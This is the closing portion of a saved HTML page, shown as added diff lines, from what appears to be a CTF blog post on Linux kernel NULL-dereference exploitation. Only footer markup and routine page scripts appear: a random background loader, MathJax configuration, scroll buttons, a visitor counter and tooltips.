+</span>
+</div>
+</div>
+</footer>
+</div>
+<script src="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/main.js"></script>
+<script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(http://oezgohqzq.bkt.clouddn.com/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+<script src="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/MathJax.jsconfig=TeX-AMS-MML_HTMLorMML" type="text/javascript">
+</script>
+<div class="scroll" id="scroll">
+<a href="#"><i class="fa fa-arrow-up"></i></a>
+<a href="#comments"><i class="fa fa-comments-o"></i></a>
+<a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+<script async="" src="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/busuanzi.pure.mini.js">
+</script>
+<script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+</div>
+</body>
+</html>
